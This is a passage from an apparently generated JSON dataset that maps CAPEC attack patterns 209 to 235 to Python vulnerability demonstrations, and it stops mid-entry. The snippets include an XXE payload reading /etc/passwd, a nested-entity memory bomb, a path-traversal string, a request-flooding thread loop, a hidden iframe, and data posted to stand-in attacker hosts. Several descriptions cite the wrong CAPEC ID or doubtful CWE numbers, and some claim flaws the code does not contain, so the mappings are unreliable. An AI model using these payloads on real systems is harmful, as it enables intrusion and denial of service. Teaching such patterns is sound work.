        "code_snippet": "class ShoppingCart:\n    def __init__(self):\n        self.items = []\n        self.total_cost = 0\n\n    def add_item(self, item, price, quantity):\n        self.items.append({'item': item, 'price': price, 'quantity': quantity})\n        self.total_cost += price * quantity\n\n    def checkout(self):\n        # Client-side calculation of total cost\n        return self.total_cost\n\n# Attacker modifies the client-side logic\nclass MaliciousShoppingCart(ShoppingCart):\n    def add_item(self, item, price, quantity):\n        self.items.append({'item': item, 'price': price, 'quantity': quantity})\n        # Manipulate the total cost calculation\n        self.total_cost += price * (quantity - 1)\n\n# Example usage\ncart = MaliciousShoppingCart()\ncart.add_item('Laptop', 1000, 2)\nprint(cart.checkout())  # Outputs 1000 instead of 2000",
        "description": "This code snippet demonstrates a vulnerable shopping cart system where the total cost of items is calculated on the client side. The `ShoppingCart` class has methods to add items and calculate the total cost. An attacker can create a subclass `MaliciousShoppingCart` that overrides the `add_item` method to manipulate the total cost calculation, reducing the quantity by 1 for each item added. This results in an incorrect total cost being sent to the server, allowing the attacker to pay less than the actual cost. This example embodies the CAPEC by showing how client-side logic can be tampered with, leading to incorrect monetary calculations. The related CWEs are represented by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation of input (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file, make_response\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file:\n        filename = file.filename\n        file.save(os.path.join('/tmp', filename))\n        return 'File uploaded successfully'\n    return 'No file uploaded'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if os.path.exists(file_path):\n        response = make_response(send_file(file_path))\n        response.headers['Content-Type'] = 'text/plain'\n        return response\n    return 'File not found', 404\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files to users. The '/upload' endpoint allows users to upload files, which are saved to a temporary directory. The '/serve/<filename>' endpoint serves the uploaded files with a 'Content-Type' header set to 'text/plain'. This setup embodies the main idea of CAPEC-147 (XSS Using MIME Type Mismatch) by demonstrating how an adversary could upload a file with scripting content but specify a MIME type that does not match the actual content. If a browser detects the mismatch and switches to interpreting the real content type without proper script filtering, it could lead to XSS attacks. The code also highlights related CWEs, such as improper input validation (CWE-20), reliance on file name or extension (CWE-646), and improper neutralization of script in attributes (CWE-82)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to XSS due to improper neutralization of input\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\n@app.route('/error')\ndef error():\n    # Missing custom error page, exposing sensitive information\n    raise Exception('This is a test exception')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with two routes: '/search' and '/error'. The '/search' route is vulnerable to Cross-Site Scripting (XSS) because it directly embeds user input into the HTML output without proper neutralization, which relates to CWE-79 and CWE-82. The '/error' route raises an exception without a custom error page, potentially exposing sensitive information, which relates to CWE-7. This code embodies the main idea of the deprecated CAPEC by showing how web tools could be used to exploit these vulnerabilities."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError(f\"The file {file_path} does not exist.\")\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example of misuse: reading a sensitive system file\nsensitive_data = read_sensitive_file('/etc/passwd')\nprint(sensitive_data)",
        "description": "This Python code snippet demonstrates a functionality misuse by leveraging a legitimate capability of the application to read a sensitive system file. The `read_sensitive_file` function is designed to read the contents of a file given its path. However, an adversary can misuse this function to read sensitive system files like '/etc/passwd', which contains user account information. This misuse aligns with the CAPEC description, as it leverages the intended functionality of file reading in an unintended way to access unauthorized sensitive data. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing sensitive system information to an unauthorized user."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of file reading that is susceptible to path traversal attacks. The function `read_file` takes a `file_path` as input and constructs a full path by joining it with a base directory (`/var/www/data/`). However, it does not properly sanitize the `file_path` input, allowing an attacker to use sequences like '../../etc/passwd' to traverse directories and access files outside the intended directory. This embodies the main idea of CAPEC-126 and related CWEs, where improper neutralization of path traversal sequences can lead to unauthorized file access."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# Direct use of sockets (CWE-246)\ndef fetch_data_from_server(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n        response = s.recv(4096)\n        s.close()\n        return response\n    except Exception as e:\n        # Missing custom error page (CWE-7)\n        print(f\"Error: {e}\")\n        return None\n\n# Example usage\nresponse = fetch_data_from_server('example.com', 80)\nif response:\n    print(response.decode())",
        "description": "This Python code snippet demonstrates a direct use of sockets to fetch data from a server, which is a bad practice in J2EE applications (CWE-246). The function `fetch_data_from_server` attempts to connect to a server and retrieve data. If an error occurs, it prints the error message directly, which can expose sensitive information (CWE-7). This embodies the main idea of the deprecated CAPEC, which involves using improper methods and configurations that can lead to information exposure and other vulnerabilities."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import logging\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Function that processes user input\ndef process_input(user_input):\n    try:\n        # Simulate processing user input\n        if not isinstance(user_input, str):\n            raise ValueError('Invalid input type')\n        # Simulate a potential error\n        if user_input == 'trigger_error':\n            raise RuntimeError('Simulated runtime error')\n        return 'Processed successfully'\n    except Exception as e:\n        # Log the error with sensitive information\n        logging.error(f'Error processing input: {e}, user_input: {user_input}')\n        return 'An error occurred'\n\n# Example usage\nuser_inputs = ['valid_input', 123, 'trigger_error']\nfor input in user_inputs:\n    print(process_input(input))",
        "description": "This Python code snippet demonstrates a simple application that processes user input and logs errors. The `process_input` function simulates processing user input and raises exceptions for invalid input types or specific error-triggering inputs. When an error occurs, it logs the error message along with the user input to a log file. This embodies the main idea of CAPEC-202 by showing how an application can generate and log error messages containing sensitive information (CWE-209, CWE-532, CWE-210). An attacker could use fuzzing techniques to send various inputs to the application, observe the log file, and potentially gain sensitive information about the application's behavior and environment."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if not data:\n        break\n    # No authentication or integrity check\n    print(f'Received data: {data.decode()}')\n    client_socket.sendall(b'ACK')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections on a specified port. The server accepts connections and receives data from clients but does not perform any authentication (CWE-306) or integrity checks (CWE-924) on the received data. Additionally, it does not verify the source of the communication (CWE-940) and does not ensure that the communication channel is secure (CWE-300). This makes the server susceptible to communication channel manipulation attacks, where an adversary can intercept, modify, or inject data into the communication stream, potentially leading to information exposure or system compromise."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context with incorrect configuration\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.verify_mode = ssl.CERT_NONE  # No certificate verification\n\n# Create a socket and wrap it with the SSL context\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nssl_sock.connect(('example.com', 443))\n\n# Send sensitive data without proper encryption\nssl_sock.sendall(b'username=admin&password=secret')\n\n# Close the connection\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an SSL/TLS connection with incorrect configuration, embodying the main idea of CAPEC 'Exploiting Incorrectly Configured SSL/TLS'. The SSL context is created with TLSv1, which is outdated and insecure, and certificate verification is disabled (CWE-294, CWE-923, CWE-940). The code then sends sensitive information (CWE-201) over this insecure connection, making it vulnerable to interception and replay attacks. This example highlights the risks of improper SSL/TLS configuration and the potential for sensitive data exposure and authentication bypass."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# CWE-112: Missing XML Validation\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef send_ebxml_message(url, xml_message):\n    try:\n        # Missing XML validation\n        # xmlschema_doc = etree.parse('schema.xsd')\n        # xmlschema = etree.XMLSchema(xmlschema_doc)\n        # xmlschema.assertValid(etree.fromstring(xml_message))\n\n        # Sending the message without verifying the authenticity of the endpoint\n        response = requests.post(url, data=xml_message, headers={'Content-Type': 'application/xml'})\n\n        # Not checking if the response is from the intended destination\n        if response.status_code == 200:\n            print('Message sent successfully')\n        else:\n            print('Failed to send message')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\nurl = 'http://malicious-actor.com/ebxml'\nxml_message = '''<ebXMLMessage>\n    <Header>\n        <From>LegitimateBusiness</From>\n        <To>Client</To>\n    </Header>\n    <Body>\n        <Order>12345</Order>\n    </Body>\n</ebXMLMessage>'''\n\nsend_ebxml_message(url, xml_message)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of sending an ebXML message. The code lacks proper XML validation (CWE-112), does not verify the authenticity of the data (CWE-345), and does not ensure message integrity during transmission (CWE-924). Additionally, it does not correctly specify the intended destination (CWE-941) and allows the communication channel to be accessed by a non-endpoint (CWE-300). The function `send_ebxml_message` sends an XML message to a specified URL without performing necessary security checks, making it susceptible to spoofing attacks as described in the CAPEC."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Simulate receiving an XML message\nxml_message = '''\n<root>\n    <data>Some data</data>\n    <route>http://malicious-node.com/process</route>\n</root>\n'''\n\n# Parse the XML message\nroot = etree.fromstring(xml_message)\n\n# Extract the route from the XML (CWE-610)\nroute = root.find('route').text\n\n# Forward the XML message to the extracted route (CWE-441)\nresponse = requests.post(route, data=etree.tostring(root))\n\n# Process the response (CWE-611)\nresponse_xml = etree.fromstring(response.content)\n\n# Print the response data\nprint(response_xml.find('data').text)\n",
        "description": "This Python code snippet demonstrates a simplified version of an XML Routing Detour Attack. The code receives an XML message, extracts a route from the XML, and forwards the message to the extracted route. This embodies the main idea of CAPEC-94, where an attacker can subvert an intermediate system to modify and re-route XML content. The code also highlights several related CWEs: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) by using an externally controlled route, CWE-441 (Unintended Proxy or Intermediary) by forwarding the request to an external actor, and CWE-611 (Improper Restriction of XML External Entity Reference) by processing the response without proper validation."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow for weak ciphers\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS)\ncontext.set_ciphers('LOW:!aNULL:!eNULL')  # Allow weak ciphers\n\n# Connect to the server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request\nrequest = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nwrapped_socket.send(request.encode())\n\n# Receive the response\nresponse = wrapped_socket.recv(4096)\nprint(response.decode())\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a client-server communication where the client uses a less secure algorithm during the SSL/TLS negotiation, which is an example of 'Algorithm Downgrade' (CWE-757). The code creates a socket and wraps it with SSL, but explicitly allows weak ciphers by setting the cipher suite to 'LOW:!aNULL:!eNULL'. This makes the communication vulnerable to attacks that exploit weak encryption algorithms. The code then connects to a server, sends an HTTP GET request, receives the response, and closes the connection. This snippet embodies the main idea of 'Client-Server Protocol Manipulation' by showing how an adversary could take advantage of weak protocol configurations to compromise the security of the communication."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///dev/random\">\n]>\n<root>&ext;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML document that includes an external entity reference. The XML data contains a DOCTYPE declaration with an external entity `ext` that points to a system file URI (`file:///dev/random`). When the XML is parsed, the external entity is replaced with the content of the specified file, which can lead to a denial of service condition by consuming a large amount of resources. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) by allowing external entities to be processed without restriction. The code also touches on CWE-99 (Improper Control of Resource Identifiers) by not validating the URI, and CWE-646 (Reliance on File Name or Extension) by potentially misclassifying the file content. The `parse_xml` function attempts to parse the XML data and print its content, but it can lead to resource exhaustion or other unintended behaviors."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head><title>Vulnerable Page</title></head>\n<body>\n    <iframe src=\"http://malicious-site.com\" width=\"0\" height=\"0\" style=\"opacity:0;position:absolute;top:0;left:0;\"></iframe>\n    <h1>Welcome to the Safe Site</h1>\n    <form action=\"/submit\" method=\"post\">\n        <input type=\"text\" name=\"user_input\" />\n        <input type=\"submit\" value=\"Submit\" />\n    </form>\n</body>\n</html>'''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    return render_template_string(f'<h1>You entered: {user_input}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates an iFrame overlay attack. The main page includes an invisible iFrame that loads content from a malicious site, which can trick the user into interacting with it unknowingly. The form on the page accepts user input and displays it back to the user without proper sanitization, making it vulnerable to Cross-site Scripting (XSS) attacks. This example embodies the CAPEC 'iFrame Overlay' attack and incorporates related CWEs such as 'Improper Restriction of Rendered UI Layers or Frames' (CWE-1021) and 'Improper Neutralization of Input During Web Page Generation' (CWE-79)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import platform\nimport socket\nimport os\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    info['cpu_info'] = platform.processor()\n    return info\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    sensitive_info = gather_system_info()\n    # Simulate exposure by printing sensitive information\n    print(\"Sensitive System Information:\")\n    for key, value in sensitive_info.items():\n        print(f\"{key}: {value}\")\n\n# Main function\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of fingerprinting by gathering and exposing sensitive system information. The `gather_system_info` function collects details such as the operating system, OS version, hostname, IP address, and CPU information. The `expose_sensitive_info` function simulates the exposure of this sensitive information by printing it to the console. This example embodies the CAPEC idea of fingerprinting, where an adversary collects system-specific details that could be used to identify weaknesses. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200, CWE-497) and observable behavioral discrepancies (CWE-207)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to session credential falsification through manipulation. The application has a login route that sets a session cookie without proper validation and integrity checking (CWE-565). The session ID is generated using a hash of the username and password, which can be predictable and manipulated if an attacker sniffs the credentials. The dashboard route relies on the session cookie without verifying its integrity, making it susceptible to external control of assumed-immutable web parameters (CWE-472). Additionally, the code does not invalidate old session IDs upon login (CWE-384) and does not handle session expiration (CWE-613). The authentication is performed on the client side by setting a cookie, which can be bypassed by modifying the client (CWE-603)."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import threading\nimport time\nimport requests\n\n# Function to simulate sustained client engagement\ndef engage_resource(url):\n    while True:\n        try:\n            response = requests.get(url)\n            # Simulate processing time\n            time.sleep(0.1)\n        except Exception as e:\n            print(f\"Error: {e}\")\n\n# URL of the target resource\ntarget_url = \"http://example.com/resource\"\n\n# Create multiple threads to engage the resource\nthreads = []\nfor _ in range(10):\n    thread = threading.Thread(target=engage_resource, args=(target_url,))\n    threads.append(thread)\n    thread.start()\n\n# Join threads to keep the main program running\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple form of a 'Sustained Client Engagement' attack. The code continuously sends requests to a specified URL using multiple threads, thereby keeping the target resource engaged and potentially denying access to legitimate users. The use of threading allows for multiple concurrent requests, which can exhaust the server's resources over time. This example embodies the CAPEC concept by not crashing or flooding the target but by keeping it busy with seemingly benign requests. The related CWEs are represented by the lack of resource control (CWE-400), absence of request throttling (CWE-770), and potential improper authorization checks (CWE-285) that could allow such an attack to succeed."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a DTD Injection vulnerability. The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive system files. This example embodies the main idea of CAPEC-112 (DTD Injection) and is related to several CWEs, including CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition). The code highlights the risk of processing untrusted XML data without proper validation and restriction of DTDs and external entities."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML parser without resource limits\nxml_data = '''<root>''' + ''.join([f'<item>{i}</item>' for i in range(1000000)]) + '''</root>'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(f'Parsed {len(root)} items.')\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that can be exploited by an attacker to cause a denial of service (DoS) condition. The code constructs an XML document with a large number of elements (1,000,000 in this case) and attempts to parse it using the `xml.etree.ElementTree` module. The parser does not impose any limits on the size or number of elements, leading to excessive CPU and memory usage during parsing. This embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' by exploiting the inefficient management of serialized data. The related CWE-770 (Allocation of Resources Without Limits or Throttling) is directly applicable here, as the parser allocates resources without any restrictions, leading to potential resource exhaustion."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data with nested entities\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"1234567890\" >\n<!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\" >\n<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\" >\n<!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\" >\n<!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\" >\n<!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\" >\n<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >\n<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >\n<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >\n<!ENTITY j \"&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;\" >\n<!ENTITY k \"&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;\" >\n<!ENTITY l \"&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;\" >\n<!ENTITY m \"&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;\" >\n<!ENTITY n \"&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;\" >\n<!ENTITY o \"&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;\" >\n<!ENTITY p \"&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;\" >\n<!ENTITY q \"&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;\" >\n<!ENTITY r \"&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;\" >\n<!ENTITY s \"&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;\" >\n<!ENTITY t \"&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;\" >\n<!ENTITY u \"&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;\" >\n<!ENTITY v \"&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;\" >\n<!ENTITY w \"&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;\" >\n<!ENTITY x \"&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;\" >\n<!ENTITY y \"&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;\" >\n<!ENTITY z \"&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;\" >\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC-112). The XML data contains deeply nested entities, which can cause excessive memory consumption and CPU utilization when parsed. This is an example of CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), and CWE-770 (Allocation of Resources Without Limits or Throttling). The code attempts to parse the XML data using Python's xml.etree.ElementTree module, which can lead to a denial-of-service (DoS) attack due to the excessive resource consumption caused by the nested entities."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that parses XML without validation\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        return tree\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\n# Example of oversized serialized data payload\noversized_payload = '<root>' + '<child>' * 10000 + '</child>' * 10000 + '</root>'\n\n# Calling the vulnerable function with the oversized payload\nparse_xml(oversized_payload)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The function `parse_xml` takes an XML string as input and parses it without any validation against a schema (CWE-112). This lack of validation can lead to improper input handling (CWE-20) and uncontrolled recursion (CWE-674) when processing deeply nested or oversized XML data. The example payload is an oversized XML string designed to exhaust system resources (CWE-770) by creating a large number of nested elements. This can potentially lead to denial of service or other adverse effects on the system."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass PrivilegeEscalation:\n    def __init__(self):\n        self.users = {}\n\n    def add_user(self, username, role):\n        self.users[username] = User(username, role)\n\n    def escalate_privilege(self, username):\n        if username in self.users:\n            user = self.users[username]\n            if user.role != 'admin':\n                user.role = 'admin'\n                print(f\"{username} has been escalated to admin.\")\n            else:\n                print(f\"{username} is already an admin.\")\n        else:\n            print(f\"User {username} does not exist.\")\n\n# Example usage\npe = PrivilegeEscalation()\npe.add_user('alice', 'user')\npe.escalate_privilege('alice')\npe.escalate_privilege('bob')",
        "description": "This Python code snippet demonstrates a simple privilege escalation vulnerability. The `PrivilegeEscalation` class manages users and their roles. The `escalate_privilege` method allows any user to be escalated to an 'admin' role without proper authorization checks. This embodies the CAPEC concept of privilege escalation by exploiting improper privilege management (CWE-269) and improper handling of insufficient privileges (CWE-274). The code does not verify if the user has the right to escalate privileges, leading to a potential security breach."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running a command with elevated privileges\ncommand = 'ls -la /root'\n\ntry:\n    # CWE-114: Process Control\n    # Using subprocess to execute a command that could be hijacked\n    result = subprocess.run(['sudo', 'sh', '-c', command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    print(result.stdout.decode())\nexcept subprocess.CalledProcessError as e:\n    print(f'Error: {e.stderr.decode()}')\n\n# CWE-271: Privilege Dropping / Lowering Errors\n# Not dropping privileges after executing the command\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# The command executed with elevated privileges can be exploited\n# CWE-648: Incorrect Use of Privileged APIs\n# Incorrectly using subprocess with elevated privileges",
        "description": "This Python code snippet demonstrates a scenario where a command is executed with elevated privileges using the 'sudo' command. The subprocess module is used to run a shell command ('ls -la /root') that lists the contents of the root directory, which requires elevated privileges. The code does not drop privileges after executing the command, which can be exploited by an attacker. This snippet embodies the main idea of 'Hijacking a privileged process' by showing how an attacker could gain control of a process with elevated privileges to execute arbitrary code. The related CWEs are highlighted in the comments to show the specific weaknesses in the code."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "import threading\nimport time\n\n# Shared resource\nshared_data = 0\n\n# Non-final static storable\nclass SharedResource:\n    data = 0\n\n# Function that simulates a privileged operation\ndef privileged_operation():\n    global shared_data\n    while True:\n        shared_data += 1\n        print(f\"Privileged operation: {shared_data}\")\n        time.sleep(1)\n\n# Function that simulates a hijacking operation\ndef hijacking_operation():\n    while True:\n        SharedResource.data += 1\n        print(f\"Hijacking operation: {SharedResource.data}\")\n        time.sleep(1)\n\n# Creating threads\nprivileged_thread = threading.Thread(target=privileged_operation)\nhijacking_thread = threading.Thread(target=hijacking_operation)\n\n# Starting threads\nprivileged_thread.start()\nhijacking_thread.start()\n\n# Joining threads\nprivileged_thread.join()\nhijacking_thread.join()",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution in a multi-threaded environment. The `privileged_operation` function simulates a privileged operation that continuously increments a global shared resource. The `hijacking_operation` function simulates an attack that hijacks the privileged thread by incrementing a non-final static storable (`SharedResource.data`). Both functions run in separate threads, representing the concurrent execution context. This setup embodies the main idea of the deprecated CAPEC pattern by showing how a privileged thread can be hijacked, and it also highlights related CWEs such as CWE-1058 (unsafe non-final static storable in a multi-threaded context)."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
